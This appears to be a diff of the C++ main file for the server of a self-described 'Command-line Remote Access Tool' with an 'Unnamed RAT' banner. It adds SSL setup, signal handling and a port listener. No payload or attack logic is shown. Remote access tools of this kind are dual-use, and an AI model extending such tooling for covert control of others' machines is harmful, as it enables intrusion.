@@ -1,38 +1,36 @@
 #include "headers.hpp"
 #include "Server.hpp"
 #include "Misc.hpp"
+bool bSignalFlag;
 
-//Just for test specific section
-void test(const char *arg2){
-	LCipher test;
-	char *output = nullptr;
-	char *output2 = nullptr;
-	test.BinaryCipher(arg2, output);
-	output2 = test.BinaryUnCipher(output);
-	std::cout<<"BinaryCipher\n"<<output<<"END\nBinaryUncipher\n"<<output2<<'\n';
-	std::cout<<"StrCipher\n"<<test.strCipher(arg2)<<"\nStrUncipher\n"<<test.strUnCipher(test.strCipher(arg2))<<'\n';
-	delete[] output2;
-	delete[] output;
+void CleanEx(int){
+	std::cout<<"\nProgram interrupted press enter to exit\n";
+	bSignalFlag = true;
 }
 
-
-
 int main(int argc, char **argv){
-	//test(argv[1]);
-	//return 0;
 	if(argc < 2){
 			std::cout<<argv[0]<<" port\n";
 			return 0;
 	}
-	//struct sigaction act;
-	//act.sa_handler = SIG_IGN;
-	//sigemptyset(&act.sa_mask);
-	//act.sa_flags = SA_RESTART;
-	//sigaction(SIGPIPE, &act, nullptr);
-	signal(SIGPIPE, SIG_IGN);
+    char cBanner[] = {"\n"\
+"▄• ▄▌ ▐ ▄  ▐ ▄  ▄▄▄· • ▌ ▄ ·. ▄▄▄ .·▄▄▄▄    ▄▄▄   ▄▄▄· ▄▄▄▄▄\n"\
+"█▪██▌•█▌▐█•█▌▐█▐█ ▀█ ·██ ▐███▪▀▄.▀·██· ██   ▀▄ █·▐█ ▀█ •██\n"\
+"█▌▐█▌▐█▐▐▌▐█▐▐▌▄█▀▀█ ▐█ ▌▐▌▐█·▐▀▀▪▄▐█▪ ▐█▌  ▐▀▀▄ ▄█▀▀█  ▐█.▪\n"\
+"▐█▄█▌██▐█▌██▐█▌▐█▪ ▐▌██ ██▌▐█▌▐█▄▄▌██. ██   ▐█•█▌▐█▪ ▐▌ ▐█▌·\n"\
+" ▀▀▀ ▀▀ █▪▀▀ █▪ ▀  ▀ ▀▀  █▪▀▀▀ ▀▀▀ ▀▀▀▀▀•   .▀  ▀ ▀  ▀  ▀▀▀\n\n"\
+"          Command-line Remote Access Tool\n"\
+"                 by d3adlym1nd\n"};
+    std::cout<<cBanner<<'\n';
+	bSignalFlag = false;
+	SSL_library_init();
+	OpenSSL_add_all_algorithms();
+	SSL_load_error_strings();
 	u_int uiLport = Misc::StrToUint(argv[1]);
 	Server *srvServer = new Server(uiLport);
-	
+	srvServer->NullClients();
+	signal(SIGPIPE, SIG_IGN);
+	signal(SIGINT, CleanEx);
 	if(srvServer->Listen(10)){
 			srvServer->thStartHandler();
 	}
